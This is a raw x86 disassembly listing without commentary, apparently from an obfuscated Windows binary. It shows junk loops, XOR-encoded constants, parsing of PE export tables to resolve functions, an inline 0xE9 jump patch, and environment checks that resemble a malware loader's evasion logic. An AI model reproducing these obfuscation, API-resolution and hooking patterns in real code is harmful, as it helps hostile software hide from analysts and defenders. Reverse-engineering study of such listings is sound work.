  423296:	lea    eax,[ebp+0x4]
  423299:	mov    DWORD PTR [ecx*4+0x42950e],eax
  4232a0:	inc    DWORD PTR ds:0x429516
  4232a6:	mov    eax,DWORD PTR [ebp-0x14]
  4232a9:	test   eax,eax
  4232ab:	je     0x423313
  4232b1:	lea    eax,[ebp-0x8]
  4232b4:	mov    DWORD PTR [ebp-0x34],eax
  4232b7:	mov    eax,DWORD PTR [ebp-0x30]
  4232ba:	mov    DWORD PTR [ebp-0x8],eax
  4232bd:	mov    eax,DWORD PTR [ebp-0x8]
  4232c0:	mov    ecx,DWORD PTR [ebp-0x14]
  4232c3:	sub    eax,ecx
  4232c5:	mov    DWORD PTR [ebp-0x8],eax
  4232c8:	mov    ecx,DWORD PTR [ebp-0x4]
  4232cb:	xor    ecx,esi
  4232cd:	mov    eax,0xffcd8d0f
  4232d2:	sub    eax,ecx
  4232d4:	add    DWORD PTR [ebp-0x8],eax
  4232d7:	mov    eax,DWORD PTR [ebp-0x8]
  4232da:	mov    ecx,DWORD PTR [ebp-0x14]
  4232dd:	mov    DWORD PTR [ecx+0x1],eax
  4232e0:	mov    eax,DWORD PTR [ebp-0x14]
  4232e3:	push   DWORD PTR [ebp-0x24]
  4232e6:	mov    BYTE PTR [eax],0xe9
  4232e9:	mov    eax,ds:0x42929a
  4232ee:	push   DWORD PTR [eax]
  4232f0:	push   DWORD PTR ds:0x4294fe
  4232f6:	push   DWORD PTR ds:0x4292a2
  4232fc:	push   DWORD PTR ds:0x4294de
  423302:	push   DWORD PTR ds:0x42a04a
  423308:	push   DWORD PTR [ebp-0x28]
  42330b:	push   DWORD PTR [ebp-0x2c]
  42330e:	mov    eax,DWORD PTR [ebp-0x14]
  423311:	call   eax
  423313:	pop    edi
  423314:	pop    esi
  423315:	leave  
  423316:	ret    
  423317:	push   ebp
  423318:	mov    ebp,esp
  42331a:	sub    esp,0x1c
  42331d:	mov    DWORD PTR ds:0x42a2ea,0x10
  423327:	cmp    DWORD PTR ds:0x42a2ea,0x0
  42332e:	je     0x42335e
  423334:	cmp    DWORD PTR ds:0x42a2ea,0x17
  42333b:	jg     0x42335e
  423341:	jmp    0x42334c
  423346:	call   DWORD PTR ds:0x42a3e2
  42334c:	mov    ecx,DWORD PTR ds:0x42a2ea
  423352:	dec    ecx
  423353:	mov    DWORD PTR ds:0x42a2ea,ecx
  423359:	jmp    0x423327
  42335e:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  423365:	sbb    ecx,ecx
  423367:	lea    eax,[ebp+0x14]
  42336a:	sub    edx,DWORD PTR ds:0x42a2da
  423370:	mov    DWORD PTR [ebp-0x4],eax
  423373:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  42337a:	and    DWORD PTR ds:0x42a302,0x5581
  423384:	lea    eax,[ebp-0xc]
  423387:	and    DWORD PTR ds:0x42a256,0x0
  423391:	jmp    0x4233a5
  423396:	xor    ecx,ecx
  423398:	or     ecx,DWORD PTR ds:0x42a256
  42339e:	inc    ecx
  42339f:	mov    DWORD PTR ds:0x42a256,ecx
  4233a5:	cmp    DWORD PTR ds:0x42a256,0x1e
  4233ac:	jae    0x4233fd
  4233b2:	cmp    DWORD PTR ds:0x42a256,0x4
  4233b9:	jg     0x4233fd
  4233bf:	jmp    0x4233de
  4233c4:	push   0x42a25a
  4233c9:	push   0x6352
  4233ce:	push   0x429009
  4233d3:	push   0x42904c
  4233d8:	call   DWORD PTR ds:0x42a3ea
  4233de:	cmp    DWORD PTR ds:0x42a256,0x3
  4233e5:	jne    0x4233f8
  4233eb:	mov    ecx,DWORD PTR ds:0x42a256
  4233f1:	inc    ecx
  4233f2:	mov    DWORD PTR ds:0x42a256,ecx
  4233f8:	jmp    0x423396
  4233fd:	mov    DWORD PTR [ebp-0x14],eax
  423400:	and    DWORD PTR ds:0x42a2f2,0x0
  42340a:	jmp    0x42341d
  42340f:	xor    eax,eax
  423411:	add    eax,DWORD PTR ds:0x42a2f2
  423417:	inc    eax
  423418:	mov    ds:0x42a2f2,eax
  42341d:	cmp    DWORD PTR ds:0x42a2f2,0x16
  423424:	jae    0x423456
  42342a:	cmp    DWORD PTR ds:0x42a2f2,0x1d
  423431:	jbe    0x423456
  423437:	jmp    0x423451
  42343c:	push   0x76a3
  423441:	push   0x42a296
  423446:	push   0x659d
  42344b:	call   DWORD PTR ds:0x42a3ee
  423451:	jmp    0x42340f
  423456:	mov    eax,DWORD PTR [ebp-0xc]
  423459:	mov    edx,DWORD PTR [ebp-0x14]
  42345c:	neg    ecx
  42345e:	mov    ecx,0x75108aa
  423463:	xor    eax,ecx
  423465:	or     DWORD PTR ds:0x42a2c2,0x55df
  42346f:	add    eax,0x3272f1
  423474:	mov    DWORD PTR [edx],eax
  423476:	xor    edx,edx
  423478:	xor    edx,DWORD PTR ds:0x42a34a
  42347e:	xor    eax,eax
  423480:	or     eax,DWORD PTR ds:0x42a35a
  423486:	sub    edx,eax
  423488:	sub    edx,DWORD PTR [edx+eax*1]
  42348b:	mov    eax,ds:0x429296
  423490:	mov    DWORD PTR ds:0x42a2da,0x16
  42349a:	cmp    DWORD PTR ds:0x42a2da,0x0
  4234a1:	je     0x4234d9
  4234a7:	cmp    DWORD PTR ds:0x42a2da,0x1d
  4234ae:	jge    0x4234d9
  4234b4:	jmp    0x4234c7
  4234b9:	push   DWORD PTR [ebp-0x20]
  4234bc:	push   0x42a2ca
  4234c1:	call   DWORD PTR ds:0x42a3f2
  4234c7:	mov    edx,DWORD PTR ds:0x42a2da
  4234cd:	dec    edx
  4234ce:	mov    DWORD PTR ds:0x42a2da,edx
  4234d4:	jmp    0x42349a
  4234d9:	mov    edx,DWORD PTR [ebp-0x4]
  4234dc:	adc    DWORD PTR ds:0x42a2be,0x42a256
  4234e6:	mov    eax,DWORD PTR [eax]
  4234e8:	and    DWORD PTR ds:0x42a286,0x12f2
  4234f2:	add    eax,DWORD PTR [edx]
  4234f4:	push   esi
  4234f5:	mov    DWORD PTR [ebp-0x8],eax
  4234f8:	and    DWORD PTR ds:0x42a2f6,0x290a
  423502:	mov    edx,DWORD PTR [ebp+0x8]
  423505:	mov    eax,ds:0x42941e
  42350a:	sbb    esi,0x612f
  423510:	mov    eax,DWORD PTR [eax+0x198]
  423516:	xor    edx,ecx
  423518:	neg    esi
  42351a:	mov    esi,0x3272f1
  42351f:	add    edx,esi
  423521:	mov    DWORD PTR ds:0x42a2b6,0x4be9
  42352b:	cmp    DWORD PTR [eax],edx
  42352d:	je     0x42354e
  423533:	mov    DWORD PTR ds:0x42a2ea,0x6dae
  42353d:	mov    eax,DWORD PTR [eax]
  42353f:	mov    DWORD PTR ds:0x42a2da,0x1950
  423549:	jmp    0x423991
  42354e:	sbb    eax,DWORD PTR ds:0x42a296
  423554:	mov    eax,DWORD PTR [ebp+0x18]
  423557:	xor    eax,ecx
  423559:	adc    DWORD PTR ds:0x42a2e6,0x42a2b2
  423563:	push   ebx
  423564:	add    eax,esi
  423566:	add    ebx,DWORD PTR ds:0x42a2a2
  42356c:	xor    edx,edx
  42356e:	mov    ebx,DWORD PTR ds:0x42a2c6
  423574:	xor    DWORD PTR ds:0x42a2a2,ebx
  42357a:	mov    ebx,0xfabdbed8
  42357f:	adc    DWORD PTR ds:0x42a2ae,0x6fd6
  423589:	add    eax,ebx
  42358b:	mov    DWORD PTR ds:0x42a296,0x25f1
  423595:	push   edi
  423596:	mov    DWORD PTR ds:0x42a2be,0x342
  4235a0:	adc    edx,0xffffffff
  4235a3:	and    DWORD PTR ds:0x42a2ee,0x0
  4235ad:	jmp    0x4235bf
  4235b2:	mov    edi,DWORD PTR ds:0x42a2ee
  4235b8:	inc    edi
  4235b9:	mov    DWORD PTR ds:0x42a2ee,edi
  4235bf:	cmp    DWORD PTR ds:0x42a2ee,0x10
  4235c6:	jae    0x423608
  4235cc:	cmp    DWORD PTR ds:0x42a2ee,0x6
  4235d3:	jbe    0x423608
  4235d9:	jmp    0x4235e9
  4235de:	push   0x42a2fe
  4235e3:	call   DWORD PTR ds:0x42a3f6
  4235e9:	cmp    DWORD PTR ds:0x42a2ee,0x5
  4235f0:	jne    0x423603
  4235f6:	mov    edi,DWORD PTR ds:0x42a2ee
  4235fc:	inc    edi
  4235fd:	mov    DWORD PTR ds:0x42a2ee,edi
  423603:	jmp    0x4235b2
  423608:	mov    edi,0x8a29a13d
  42360d:	mov    DWORD PTR ds:0x42a25e,0x2bce
  423617:	xor    eax,edi
  423619:	sub    DWORD PTR ds:0x42a266,0x304b
  423623:	xor    edx,0x0
  423626:	mov    DWORD PTR ds:0x42a2b2,0x550
  423630:	cmp    eax,0x70941fe5
  423635:	mov    DWORD PTR ds:0x42a2c2,0x6d49
  42363f:	jne    0x423676
  423645:	mov    DWORD PTR ds:0x42a2fa,0x2c4a
  42364f:	cmp    edx,0xffffffff
  423652:	mov    DWORD PTR ds:0x42a2de,0x7cde
  42365c:	jne    0x423676
  423662:	push   0xf89c85ba
  423667:	mov    DWORD PTR ds:0x42a2ca,0x25f0
  423671:	jmp    0x42397e
  423676:	xor    DWORD PTR ds:0x42a2e2,edi
  42367c:	mov    eax,DWORD PTR [ebp+0x18]
  42367f:	and    DWORD PTR ds:0x42a25a,0x42a296
  423689:	xor    eax,ecx
  42368b:	add    eax,esi
  42368d:	sub    DWORD PTR ds:0x42a292,0x6866
  423697:	xor    edx,edx
  423699:	or     DWORD PTR ds:0x42a25a,0x42a2e6
  4236a3:	add    eax,ebx
  4236a5:	mov    DWORD PTR ds:0x42a2f6,0x1dc4
  4236af:	adc    edx,0xffffffff
  4236b2:	not    DWORD PTR ds:0x42a2ae
  4236b8:	xor    eax,edi
  4236ba:	xor    edx,0x0
  4236bd:	cmp    eax,0x70941fe7
  4236c2:	jne    0x42396b
  4236c8:	cmp    edx,0xffffffff
  4236cb:	jne    0x42396b
  4236d1:	mov    eax,DWORD PTR [ebp+0x10]
  4236d4:	xor    eax,ecx
  4236d6:	mov    DWORD PTR ds:0x42a2aa,0x16
  4236e0:	cmp    DWORD PTR ds:0x42a2aa,0x0
  4236e7:	je     0x423724
  4236ed:	cmp    DWORD PTR ds:0x42a2aa,0x25
  4236f4:	jbe    0x423724
  4236fa:	jmp    0x423712
  4236ff:	push   0x1425
  423704:	push   0x42a2b6
  423709:	push   DWORD PTR [ebp-0x14]
  42370c:	call   DWORD PTR ds:0x42a3fa
  423712:	mov    edx,DWORD PTR ds:0x42a2aa
  423718:	dec    edx
  423719:	mov    DWORD PTR ds:0x42a2aa,edx
  42371f:	jmp    0x4236e0
  423724:	add    eax,esi
  423726:	mov    edx,DWORD PTR ds:0x42a292
  42372c:	sbb    edx,DWORD PTR ds:0x42a2de
  423732:	mov    DWORD PTR ds:0x42a292,edx
  423738:	mov    DWORD PTR [ebp-0x18],eax
  42373b:	and    DWORD PTR ds:0x42a2b6,0x0
  423745:	jmp    0x423755
  42374a:	mov    eax,ds:0x42a2b6
  42374f:	inc    eax
  423750:	mov    ds:0x42a2b6,eax
  423755:	cmp    DWORD PTR ds:0x42a2b6,0x13
  42375c:	jae    0x42378a
  423762:	cmp    DWORD PTR ds:0x42a2b6,0x17
  423769:	ja     0x42378a
  42376f:	jmp    0x423785
  423774:	push   0x3d13
  423779:	push   DWORD PTR [ebp-0x14]
  42377c:	push   DWORD PTR [ebp-0x14]
  42377f:	call   DWORD PTR ds:0x42a402
  423785:	jmp    0x42374a
  42378a:	mov    eax,DWORD PTR [ebp+0xc]
  42378d:	mov    edx,DWORD PTR [ebp-0x8]
  423790:	xor    eax,ecx
  423792:	not    DWORD PTR ds:0x42a2ea
  423798:	add    eax,esi
  42379a:	imul   eax,DWORD PTR [edx]
  42379d:	dec    edx
  42379e:	mov    edx,DWORD PTR [ebp+0x8]
  4237a1:	xor    edx,ecx
  4237a3:	add    edx,esi
  4237a5:	cmp    edx,eax
  4237a7:	mov    eax,DWORD PTR [ebp-0x4]
  4237aa:	mov    DWORD PTR ds:0x42a26a,0x1fb7
  4237b4:	je     0x4237e8
  4237ba:	mov    edx,DWORD PTR [ebp-0x18]
  4237bd:	add    DWORD PTR [eax],edx
  4237bf:	mov    eax,DWORD PTR [ebp-0x4]
  4237c2:	mov    edx,DWORD PTR [ebp+0xc]
  4237c5:	xor    edx,ecx
  4237c7:	add    edx,esi
  4237c9:	imul   edx,DWORD PTR [eax]
  4237cc:	mov    DWORD PTR [eax],edx
  4237ce:	mov    eax,DWORD PTR [ebp-0x4]
  4237d1:	mov    DWORD PTR [ebp-0x1c],eax
  4237d4:	mov    eax,DWORD PTR [ebp+0x10]
  4237d7:	xor    eax,ecx
  4237d9:	mov    edx,0xffcd8d0f
  4237de:	sub    edx,eax
  4237e0:	mov    eax,DWORD PTR [ebp-0x1c]
  4237e3:	jmp    0x423802
  4237e8:	mov    edx,DWORD PTR [ebp+0x14]
  4237eb:	xor    DWORD PTR [eax],edx
  4237ed:	mov    eax,DWORD PTR [ebp-0x4]
  4237f0:	mov    DWORD PTR [ebp-0x1c],eax
  4237f3:	mov    eax,DWORD PTR [ebp+0x10]
  4237f6:	xor    eax,ecx
  4237f8:	mov    edx,0xffcd8d0f
  4237fd:	sub    edx,eax
  4237ff:	mov    eax,DWORD PTR [ebp-0x1c]
  423802:	add    DWORD PTR [eax],edx
  423804:	mov    eax,DWORD PTR [ebp-0x4]
  423807:	mov    edx,DWORD PTR [ebp-0x8]
  42380a:	add    edx,DWORD PTR [eax]
  42380c:	mov    DWORD PTR [ebp-0x8],edx
  42380f:	mov    eax,DWORD PTR [ebp+0xc]
  423812:	mov    edx,DWORD PTR [ebp+0xc]
  423815:	xor    edx,ecx
  423817:	xor    eax,ecx
  423819:	lea    eax,[eax+edx*1+0x64e5e2]
  423820:	mov    edx,DWORD PTR [ebp+0xc]
  423823:	xor    edx,ecx
  423825:	add    edx,esi
  423827:	imul   eax,edx
  42382a:	mov    edx,DWORD PTR [ebp+0xc]
  42382d:	xor    edx,ecx
  42382f:	sub    edx,eax
  423831:	mov    eax,DWORD PTR [ebp-0x4]
  423834:	add    edx,esi
  423836:	cmp    DWORD PTR [eax],edx
  423838:	mov    eax,DWORD PTR [ebp-0x4]
  42383b:	jg     0x423858
  423841:	mov    DWORD PTR [ebp-0x1c],eax
  423844:	mov    eax,DWORD PTR [ebp+0x10]
  423847:	xor    eax,ecx
  423849:	mov    edx,0xffcd8d0f
  42384e:	sub    edx,eax
  423850:	mov    eax,DWORD PTR [ebp-0x1c]
  423853:	jmp    0x42385f
  423858:	mov    edx,DWORD PTR [ebp+0x10]
  42385b:	xor    edx,ecx
  42385d:	add    edx,esi
  42385f:	add    DWORD PTR [eax],edx
  423861:	mov    eax,DWORD PTR [ebp-0x8]
  423864:	mov    edx,DWORD PTR [ebp-0x10]
  423867:	mov    eax,DWORD PTR [eax]
  423869:	xor    edx,ecx
  42386b:	add    edx,0x3272f0
  423871:	not    edx
  423873:	and    eax,edx
  423875:	mov    DWORD PTR [ebp-0x4],eax
  423878:	movsx  eax,BYTE PTR [eax+0x1]
  42387c:	cdq    
  42387d:	add    eax,ebx
  42387f:	adc    edx,0xffffffff
  423882:	xor    eax,edi
  423884:	xor    edx,0x0
  423887:	cmp    eax,0x70941e0f
  42388c:	jne    0x4238c0
  423892:	cmp    edx,0xffffffff
  423895:	jne    0x4238c0
  42389b:	mov    eax,DWORD PTR [ebp-0x4]
  42389e:	movsx  eax,BYTE PTR [eax]
  4238a1:	cdq    
  4238a2:	add    eax,ebx
  4238a4:	adc    edx,0xffffffff
  4238a7:	xor    eax,edi
  4238a9:	xor    edx,0x0
  4238ac:	cmp    eax,0x70941e18
  4238b1:	jne    0x4238c0
  4238b7:	cmp    edx,0xffffffff
  4238ba:	je     0x4238d7
  4238c0:	mov    eax,DWORD PTR [ebp-0x10]
  4238c3:	xor    eax,ecx
  4238c5:	mov    edx,0xffcd8d0f
  4238ca:	sub    edx,eax
  4238cc:	add    DWORD PTR [ebp-0x4],edx
  4238cf:	mov    eax,DWORD PTR [ebp-0x4]
  4238d2:	jmp    0x423878
  4238d7:	mov    eax,DWORD PTR [ebp-0x14]
  4238da:	mov    eax,DWORD PTR [eax]
  4238dc:	mov    edx,DWORD PTR [ebp-0x4]
  4238df:	mov    edx,DWORD PTR [edx+0x3c]
  4238e2:	lea    eax,[edx+eax*8+0x78]
  4238e6:	mov    edx,DWORD PTR [ebp-0x4]
  4238e9:	mov    eax,DWORD PTR [eax+edx*1]
  4238ec:	mov    DWORD PTR [ebp-0x8],eax
  4238ef:	mov    eax,DWORD PTR [ebp+0x8]
  4238f2:	xor    eax,ecx
  4238f4:	add    eax,esi
  4238f6:	mov    DWORD PTR [ebp-0x14],eax
  4238f9:	mov    eax,DWORD PTR [ebp+0x8]
  4238fc:	mov    edx,DWORD PTR [ebp-0x8]
  4238ff:	xor    eax,ecx
  423901:	add    eax,esi
  423903:	cmp    edx,eax
  423905:	jne    0x423923
  42390b:	mov    eax,DWORD PTR [ebp+0xc]
  42390e:	xor    eax,ecx
  423910:	mov    ecx,DWORD PTR [ebp-0x8]
  423913:	add    eax,esi
  423915:	imul   eax,ecx
  423918:	mov    DWORD PTR [ebp-0x8],eax
  42391b:	push   DWORD PTR [ebp+0x18]
  42391e:	jmp    0x42397e
  423923:	mov    eax,DWORD PTR [ebp-0x8]
  423926:	mov    ecx,DWORD PTR [ebp-0x4]
  423929:	add    eax,ecx
  42392b:	mov    DWORD PTR [ebp-0x14],eax
  42392e:	mov    eax,DWORD PTR [ebp-0x14]
  423931:	mov    eax,DWORD PTR [eax+0xc]
  423934:	movsx  eax,BYTE PTR [eax+ecx*1]
  423938:	cdq    
  423939:	add    eax,ebx
  42393b:	adc    edx,0xffffffff
  42393e:	xor    eax,edi
  423940:	xor    edx,0x0
  423943:	cmp    eax,0x70941e1e
  423948:	jne    0x42391b
  42394e:	cmp    edx,0xffffffff
  423951:	jne    0x42391b
  423957:	mov    eax,ds:0x42941e
  42395c:	mov    eax,DWORD PTR [eax+0x198]
  423962:	mov    DWORD PTR [eax],ecx
  423964:	mov    eax,ecx
  423966:	jmp    0x42398f
  42396b:	mov    eax,DWORD PTR [ebp+0x18]
  42396e:	cmp    eax,0xf89c85ba
  423973:	jne    0x42398f
  423979:	push   0xf89c85bb
  42397e:	push   DWORD PTR [ebp+0x14]
  423981:	push   DWORD PTR [ebp+0x10]
  423984:	push   DWORD PTR [ebp+0xc]
  423987:	push   DWORD PTR [ebp+0x8]
  42398a:	call   0x423317
  42398f:	pop    edi
  423990:	pop    ebx
  423991:	pop    esi
  423992:	leave  
  423993:	ret    0x14
  423996:	push   ebp
  423997:	mov    ebp,esp
  423999:	and    esp,0xfffffff8
  42399c:	mov    DWORD PTR ds:0x42a276,0x3141
  4239a6:	sub    esp,0x3fc
  4239ac:	mov    DWORD PTR ds:0x42a2fa,0x2654
  4239b6:	push   ebx
  4239b7:	push   esi
  4239b8:	adc    DWORD PTR ds:0x42a2f2,0x42a2e6
  4239c2:	push   edi
  4239c3:	xor    edi,edi
  4239c5:	or     DWORD PTR ds:0x42a256,0x42a2de
  4239cf:	push   edi
  4239d0:	call   DWORD PTR ds:0x42a3b6
  4239d6:	add    DWORD PTR ds:0x42a2e2,0x667e
  4239e0:	mov    DWORD PTR [esp+0x10],eax
  4239e4:	sbb    DWORD PTR ds:0x42a2f2,0x42a27e
  4239ee:	lea    eax,[esp+0x78]
  4239f2:	push   eax
  4239f3:	sbb    DWORD PTR ds:0x42a302,0x70a3
  4239fd:	push   0x429542
  423a02:	or     DWORD PTR ds:0x42a2be,0x4f4
  423a0c:	call   DWORD PTR ds:0x42a3c6
  423a12:	mov    DWORD PTR ds:0x42a2c6,0x224d
  423a1c:	cmp    eax,0xffffffff
  423a1f:	mov    DWORD PTR ds:0x42a26a,0x664
  423a29:	je     0x423a40
  423a2f:	xor    eax,eax
  423a31:	mov    DWORD PTR ds:0x42a2ee,0x6e63
  423a3b:	jmp    0x424c92
  423a40:	mov    DWORD PTR ds:0x42a2ee,0x3a46
  423a4a:	mov    esi,DWORD PTR ds:0x42a3fe
  423a50:	push   0xf
  423a52:	lea    eax,[esp+0x44]
  423a56:	xor    DWORD PTR ds:0x42a26a,0x150a
  423a60:	push   eax
  423a61:	push   0x429556
  423a66:	push   0x42956a
  423a6b:	xor    DWORD PTR ds:0x42a2de,0x3930
  423a75:	push   0x42958a
  423a7a:	call   esi
  423a7c:	imul   eax,eax,0x300000
  423a82:	cmp    eax,0x1b00000
  423a87:	jne    0x423a2f
  423a8d:	sub    DWORD PTR ds:0x42a26a,0x42a2e2
  423a97:	lea    eax,[esp+0x1b8]
  423a9e:	adc    DWORD PTR ds:0x42a28e,0x3c8a
  423aa8:	push   eax
  423aa9:	push   0x4295c6
  423aae:	call   DWORD PTR ds:0x42a3e6
  423ab4:	mov    DWORD PTR ds:0x42a2ca,0x78b4
  423abe:	cmp    eax,0xffffffff
  423ac1:	mov    DWORD PTR ds:0x42a296,0x5d2d
  423acb:	jne    0x423a2f
  423ad1:	and    DWORD PTR ds:0x42a25e,0x42a266
  423adb:	push   DWORD PTR [esp+0x10]
  423adf:	push   edi
  423ae0:	call   DWORD PTR ds:0x42a3ba
  423ae6:	add    DWORD PTR ds:0x42a256,0x6e9d
  423af0:	mov    DWORD PTR [esp+0x30],edi
  423af4:	or     ecx,ecx
  423af6:	mov    DWORD PTR [esp+0x20],0xf89c85a5
  423afe:	mov    DWORD PTR ds:0x42a2ba,0x17
  423b08:	cmp    DWORD PTR ds:0x42a2ba,0x0
  423b0f:	je     0x423b72
  423b15:	cmp    DWORD PTR ds:0x42a2ba,0x4
  423b1c:	jl     0x423b72
  423b22:	jmp    0x423b44
  423b27:	push   0x1
  423b29:	push   0x4b19
  423b2e:	push   DWORD PTR [ebp-0x1c]
  423b31:	push   0x1751
  423b36:	push   0x1baf
  423b3b:	push   DWORD PTR [ebp-0x24]
  423b3e:	call   DWORD PTR ds:0x42a3c2
  423b44:	cmp    DWORD PTR ds:0x42a2ba,0x5
  423b4b:	jne    0x423b5e
  423b51:	mov    ecx,DWORD PTR ds:0x42a2ba
  423b57:	dec    ecx
  423b58:	mov    DWORD PTR ds:0x42a2ba,ecx
  423b5e:	xor    ecx,ecx
  423b60:	xor    ecx,DWORD PTR ds:0x42a2ba
  423b66:	dec    ecx
  423b67:	mov    DWORD PTR ds:0x42a2ba,ecx
  423b6d:	jmp    0x423b08
  423b72:	mov    DWORD PTR [esp+0xc],0xf89c85ba
  423b7a:	adc    DWORD PTR ds:0x42a292,edx
  423b80:	lea    eax,[esp+0x3c]
  423b84:	mov    edi,DWORD PTR ds:0x42a2ba
  423b8a:	or     DWORD PTR ds:0x42a26e,edi
  423b90:	mov    DWORD PTR [esp+0x30],eax
  423b94:	lea    eax,[esp+0x38]
  423b98:	and    edi,ecx
  423b9a:	mov    DWORD PTR [esp+0x10],eax
  423b9e:	add    edi,ecx
  423ba0:	mov    eax,ds:0x42941e
  423ba5:	and    DWORD PTR ds:0x42a25a,0x0
  423baf:	jmp    0x423bc1
  423bb4:	mov    edi,DWORD PTR ds:0x42a25a
  423bba:	inc    edi
  423bbb:	mov    DWORD PTR ds:0x42a25a,edi
  423bc1:	cmp    DWORD PTR ds:0x42a25a,0x16
  423bc8:	jae    0x423bf5
  423bce:	cmp    DWORD PTR ds:0x42a25a,0x17
  423bd5:	jbe    0x423bf5
  423bdb:	jmp    0x423bf0
  423be0:	push   0x42a256
  423be5:	push   0x42919f
  423bea:	call   DWORD PTR ds:0x42a3ca
  423bf0:	jmp    0x423bb4
  423bf5:	mov    eax,DWORD PTR [eax+0x1c8]
  423bfb:	sbb    ebx,edi
  423bfd:	mov    eax,DWORD PTR [eax]
  423bff:	add    DWORD PTR ds:0x42a26a,0x5b95
  423c09:	mov    ecx,DWORD PTR [esp+0x10]
  423c0d:	mov    edi,0x75108aa
  423c12:	mov    ebx,DWORD PTR ds:0x42a2e6
  423c18:	sbb    DWORD PTR ds:0x42a25e,ebx
  423c1e:	xor    eax,edi
  423c20:	adc    DWORD PTR ds:0x42a2fe,0x37f0
  423c2a:	mov    ebx,0x3272f1
  423c2f:	add    DWORD PTR ds:0x42a2ae,0x42a2b2
  423c39:	add    eax,ebx
  423c3b:	not    DWORD PTR ds:0x42a2ae
  423c41:	mov    DWORD PTR [ecx],eax
  423c43:	mov    DWORD PTR ds:0x42a2d6,0x5252
  423c4d:	mov    eax,ds:0x42a11a
  423c52:	cmp    eax,0x445cecf9
  423c57:	mov    DWORD PTR ds:0x42a2c6,0x4b3f
  423c61:	jne    0x423d4f
  423c67:	mov    eax,DWORD PTR [esp+0x20]
  423c6b:	and    DWORD PTR ds:0x42a2b6,0x0
  423c75:	jmp    0x423c87
  423c7a:	mov    ecx,DWORD PTR ds:0x42a2b6
  423c80:	inc    ecx
  423c81:	mov    DWORD PTR ds:0x42a2b6,ecx
  423c87:	cmp    DWORD PTR ds:0x42a2b6,0x14
  423c8e:	jae    0x423cd7
  423c94:	cmp    DWORD PTR ds:0x42a2b6,0x8
  423c9b:	ja     0x423cd7
  423ca1:	jmp    0x423cb6
  423ca6:	push   0x84fb
  423cab:	push   0x42a28e
  423cb0:	call   DWORD PTR ds:0x42a3ce
  423cb6:	cmp    DWORD PTR ds:0x42a2b6,0x7
  423cbd:	jne    0x423cd2
  423cc3:	xor    ecx,ecx
  423cc5:	add    ecx,DWORD PTR ds:0x42a2b6
  423ccb:	inc    ecx
  423ccc:	mov    DWORD PTR ds:0x42a2b6,ecx
  423cd2:	jmp    0x423c7a
  423cd7:	mov    ecx,DWORD PTR ds:0x42941e
  423cdd:	adc    DWORD PTR ds:0x42a2be,0x42a2b2
  423ce7:	mov    ecx,DWORD PTR [ecx+0x198]
  423ced:	adc    DWORD PTR ds:0x42a2ae,0x42a29a
  423cf7:	xor    eax,edi
  423cf9:	sub    DWORD PTR ds:0x42a27a,0x42a2a2
  423d03:	add    eax,ebx
  423d05:	add    DWORD PTR ds:0x42a26a,0x42a266
  423d0f:	mov    DWORD PTR [ecx],eax
  423d11:	mov    eax,DWORD PTR [esp+0x20]
  423d15:	xor    eax,edi
  423d17:	not    DWORD PTR ds:0x42a2be
  423d1d:	add    eax,ebx
  423d1f:	sbb    DWORD PTR ds:0x42a2f6,0x42a2de
  423d29:	mov    ds:0x42a11a,eax
  423d2e:	mov    eax,DWORD PTR [esp+0x20]
  423d32:	sbb    DWORD PTR ds:0x42a286,0x42a26a
  423d3c:	xor    eax,edi
  423d3e:	sub    DWORD PTR ds:0x42a272,0x5dcc
  423d48:	add    eax,ebx
  423d4a:	mov    ds:0x429516,eax
  423d4f:	and    DWORD PTR ds:0x42a2ce,0x0
  423d59:	xor    eax,eax
  423d5b:	xor    eax,DWORD PTR ds:0x42a2ce
  423d61:	inc    eax
  423d62:	mov    ds:0x42a2ce,eax
  423d67:	cmp    DWORD PTR ds:0x42a2ce,0x10
  423d6e:	jg     0x423db4
  423d74:	jmp    0x423d8f
  423d79:	push   DWORD PTR [ebp-0x18]
  423d7c:	push   0x42a2b6
  423d81:	push   DWORD PTR [ebp-0x10]
  423d84:	push   0x4828
  423d89:	call   DWORD PTR ds:0x42a3d2
  423d8f:	cmp    DWORD PTR ds:0x42a2ce,0xf
  423d96:	jne    0x423da7
  423d9c:	mov    eax,ds:0x42a2ce
  423da1:	inc    eax
  423da2:	mov    ds:0x42a2ce,eax
  423da7:	cmp    DWORD PTR ds:0x42a2ce,0x1a
  423dae:	jb     0x423d59
  423db4:	mov    eax,ds:0x42941e
  423db9:	mov    eax,DWORD PTR [eax+0x18c]
  423dbf:	add    DWORD PTR ds:0x42a28e,0x42a292
  423dc9:	mov    eax,DWORD PTR [eax]
  423dcb:	neg    DWORD PTR ds:0x42a302
  423dd1:	mov    DWORD PTR [esp+0x60],eax
  423dd5:	xor    eax,eax
  423dd7:	xor    eax,DWORD PTR ds:0x42a27a
  423ddd:	xor    eax,DWORD PTR ds:0x42a266
  423de3:	mov    ds:0x42a27a,eax
  423de8:	mov    eax,0xf89c85b9
  423ded:	mov    DWORD PTR [esp+0x18],eax
  423df1:	mov    DWORD PTR [esp+0x18],eax
  423df5:	and    DWORD PTR ds:0x42a2ae,0xe84
  423dff:	mov    DWORD PTR [esp+0x18],eax
  423e03:	sub    DWORD PTR ds:0x42a2ce,0x42a2d6
  423e0d:	mov    DWORD PTR [esp+0x18],0xf89c85a5
  423e15:	adc    DWORD PTR ds:0x42a2f2,0x42a29a
  423e1f:	mov    DWORD PTR [esp+0x10],eax
  423e23:	xor    eax,0x48fc
  423e28:	mov    DWORD PTR [esp+0x10],0xf89c85bd
  423e30:	mov    eax,DWORD PTR [esp+0x20]
  423e34:	add    DWORD PTR ds:0x42a2fa,0x42a25e
  423e3e:	xor    eax,edi
  423e40:	sub    DWORD PTR ds:0x42a29a,0x2bd1
  423e4a:	add    eax,ebx
  423e4c:	mov    DWORD PTR ds:0x42a276,0x6294
  423e56:	jmp    0x42409a
  423e5b:	lea    eax,[esp+0x78]
  423e5f:	push   eax
  423e60:	dec    DWORD PTR ds:0x42a292
  423e66:	push   0x4295b2
  423e6b:	adc    DWORD PTR ds:0x42a2fa,0x42a2de
  423e75:	call   DWORD PTR ds:0x42a3c6
  423e7b:	mov    DWORD PTR ds:0x42a262,0x2f3f
  423e85:	cmp    eax,0xffffffff
  423e88:	jne    0x423a2f
  423e8e:	add    DWORD PTR ds:0x42a2da,0x42a2d2
  423e98:	push   0xf
  423e9a:	and    DWORD PTR ds:0x42a2ce,0x42a27e
  423ea4:	lea    eax,[esp+0x44]
  423ea8:	push   eax
  423ea9:	push   0x429606
  423eae:	push   0x42961a
  423eb3:	push   0x42963a
  423eb8:	call   esi
